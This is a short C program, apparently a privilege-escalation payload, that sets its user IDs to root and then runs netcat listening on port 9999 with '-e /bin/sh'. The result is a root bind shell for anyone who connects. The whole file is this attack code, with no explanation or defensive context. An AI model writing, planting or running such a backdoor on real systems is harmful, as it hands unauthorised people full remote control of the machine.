#include <stdio.h>
#include <string.h>
#include <unistd.h>
int main()
{
	setresuid(0,0,0); 	/* Set res UID 0 0 0 to all program */
	char *envp[] = { NULL };
	char *argv[] = {"/bin/nc", "-lvp9999", "-e/bin/sh", NULL};
	int ret = execve("/bin/nc", argv, envp); /* exec the command */
}
